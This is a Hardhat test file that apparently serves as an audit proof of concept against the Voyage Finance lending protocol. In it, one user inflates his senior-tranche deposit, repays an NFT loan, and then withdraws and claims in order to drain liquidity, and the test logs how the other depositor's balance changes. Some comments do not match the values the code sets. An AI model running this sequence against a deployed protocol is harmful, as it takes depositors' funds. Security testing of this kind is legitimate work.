import { MAX_UINT_256 } from '@helpers/math';
import { setupTestSuite } from '@helpers/setupTestSuite';
import { Tranche } from '@helpers/types';
import {
  LooksRareExchangeAbi,
  MakerOrderWithVRS,
  TakerOrderWithEncodedParams,
} from '@looksrare/sdk';
import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
  it.only('should be able to withdraw Principal + Interest incorrectly', async () => {
    const {
      crab,
      alice,
      bob,
      voyage,
      priceOracle,
      marketPlace,
      weth,
      juniorDepositToken,
      seniorDepositToken,
      reserveConfiguration,
    } = await setupTestSuite();

    /* ----------- cause Alice to deposit 6 ETH to the senior tranche ----------- */
    // deposit 3k ETH to junior
    const initialJuniorDeposit = ethers.utils.parseEther('3000');
    // deposit 6k ETH to senior
    const initialSeniorDeposit = ethers.utils.parseEther('6000');
    // alice will do the deposit.
    const aSigner = await ethers.getSigner(alice);
    await weth
      .connect(aSigner)
      .deposit({ value: ethers.utils.parseEther('10000') });
    await weth.connect(aSigner).approve(voyage.address, MAX_UINT_256);
    const aVoyage = voyage.connect(aSigner);
    await aVoyage.deposit(crab.address, 0, initialJuniorDeposit, {
      from: alice,
    });
    expect(await voyage.balance(crab.address, alice, Tranche.Junior)).to.equal(
      initialJuniorDeposit
    );
    expect(await juniorDepositToken.totalAssets()).to.equal(
      initialJuniorDeposit
    );
    await aVoyage.deposit(crab.address, 1, initialSeniorDeposit, {
      from: alice,
    });
    expect(await voyage.balance(crab.address, alice, Tranche.Senior)).to.equal(
      initialSeniorDeposit
    );
    expect(await seniorDepositToken.totalAssets()).to.equal(
      initialSeniorDeposit
    );

    /* ----------------- have Bob purchase an NFT valued at 9ETH ---------------- */
    const bSigner = await ethers.getSigner(bob);
    const salt = ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('bob@voyage.finance'))
      .slice(0, 42);
    await voyage.createVault(bob, salt);
    const bVaultAddress = await voyage.getVault(bob);
    const bWeth = weth.connect(bSigner);
    await bSigner.sendTransaction({
      to: bVaultAddress,
      value: ethers.utils.parseEther('100'),
    });
    await bWeth.deposit({ value: ethers.utils.parseEther('100000') });
    await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('3000'));
    await bWeth.approve(bVaultAddress, MAX_UINT_256);
    // set the to 9 ETH
    await priceOracle.updateTwap(crab.address, ethers.utils.parseEther('3000'));

    const provider = new ethers.providers.AlchemyProvider(
      'rinkeby',
      process.env.RINKEBY_API_KEY
    );
    const looks = new ethers.Contract(
      '0x1AA777972073Ff66DCFDeD85749bDD555C0665dA',
      LooksRareExchangeAbi,
      provider
    );
    const looksRareMakerOrderData: MakerOrderWithVRS = {
      isOrderAsk: true,
      signer: '0xAc786F3E609eeBC3830A26881bd026B6b9211ae2',
      collection: '0xd10E39Afe133eF729aE7f4266B26d173BC5AD1B1',
      price: ethers.utils.parseEther('9'), // 9 ETH value
      tokenId: '1',
      amount: 1,
      strategy: '0x732319A3590E4fA838C111826f9584a9A2fDEa1a',
      currency: '0xc778417E063141139Fce010982780140Aa0cD5Ab',
      nonce: ethers.constants.Zero,
      startTime: 1661852317,
      endTime: 1662457076,
      minPercentageToAsk: 9800,
      params: ethers.utils.defaultAbiCoder.encode([], []),
      v: 27,
      r: '0x66f2bf329cf885420596359ed1b435ef3ffe3b35efcbf10854b393724482369b',
      s: '0x6db5028edf4f90eba89576e8181a4b4051ae9053b08b0dfb5c0fd6c580b73f66',
    };
    const looksRareTakerOrderData: TakerOrderWithEncodedParams = {
      isOrderAsk: false,
      taker: bVaultAddress,
      price: looksRareMakerOrderData.price,
      tokenId: looksRareMakerOrderData.tokenId,
      minPercentageToAsk: 9800,
      params: ethers.utils.defaultAbiCoder.encode([], []),
    };
    const calldata = (
      await looks.populateTransaction.matchAskWithTakerBidUsingETHAndWETH(
        looksRareTakerOrderData,
        looksRareMakerOrderData
      )
    ).data!;
    // buy
    const bVoyage = voyage.connect(bSigner);
    await bVoyage.buyNow(
      crab.address,
      1,
      bVaultAddress,
      marketPlace.address,
      calldata
    );
    console.log('----after buy----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets:',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );

    /* ----------------- have Bob deposit a large amount of WETH ---------------- */
    await bWeth.deposit({ value: ethers.utils.parseEther('1000000') });
    await bWeth.approve(voyage.address, MAX_UINT_256);
    // deposit ~10x totalAssets()
    const bDeposit = ethers.utils.parseEther('1000000');
    await bVoyage.deposit(crab.address, 1, bDeposit);
    console.log('----after deposit----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets:',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );

    /* --------------------- have Bob repay both instalments -------------------- */
    const loan = await voyage.getLoanDetail(bVaultAddress, crab.address, 0);
    const pmtPrincipal = loan.pmt.principal;
    const pmtInterest = loan.pmt.interest;
    await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('7'));
    await bVoyage.repay(crab.address, 0, bVaultAddress);
    console.log('----after repay 1----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets: ',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );
    await bVoyage.repay(crab.address, 0, bVaultAddress);

    console.log('----after repay 2----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets: ',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );

    /* ----------------------- have Bob withdraw his WETH ----------------------- */
    expect(await weth.balanceOf(seniorDepositToken.address)).to.equal(
      initialSeniorDeposit
        .add(bDeposit)
        .add(pmtInterest.mul(3).percentMul(reserveConfiguration.incomeRatio))
    );
    const bBalance0 = await seniorDepositToken.maxWithdraw(bob);
    console.log(
      'Bob withdrawable balance: ',
      ethers.utils.formatEther(bBalance0)
    );
    const aBalance0 = await seniorDepositToken.maxWithdraw(alice);
    console.log(
      'Alice withdrawable balance: ',
      ethers.utils.formatEther(aBalance0)
    );
    console.log(
      'Total withdrawable: ',
      ethers.utils.formatEther(bBalance0.add(aBalance0))
    );

    await seniorDepositToken
      .connect(bSigner)
      .approve(voyage.address, MAX_UINT_256);
    await bVoyage.withdraw(crab.address, 1, bBalance0);

    console.log('----after withdraw----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets: ',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );
    const bBalance1 = await seniorDepositToken.maxWithdraw(bob);
    console.log(
      'Bob withdrawable balance: ',
      ethers.utils.formatEther(bBalance1)
    );
    const aBalance1 = await seniorDepositToken.maxWithdraw(alice);
    console.log(
      'Alice withdrawable balance: ',
      ethers.utils.formatEther(aBalance1)
    );

    /* ----------------------------- have Bob claim ----------------------------- */
    const wethBalance0 = await weth.balanceOf(bob);
    await seniorDepositToken.connect(bSigner).claim();
    const wethBalance1 = await weth.balanceOf(bob);
    const totalClaimed = wethBalance1.sub(wethBalance0);
    expect(totalClaimed).to.equal(bBalance0);

    console.log('----after claim----\n');
    console.log(
      'Available liquidity: ',
      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
    );
    console.log(
      'Total assets:',
      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
    );
    const aBalance2 = await seniorDepositToken.maxWithdraw(alice);
    console.log(
      'Alice withdrawable balance: ',
      ethers.utils.formatEther(aBalance2)
    );
    // await seniorDepositToken.connect(bSigner).claim();
    // const wethBalance2 = await weth.balanceOf(bob);
    // expect(wethBalance2).to.equal(wethBalance1);
  });
});
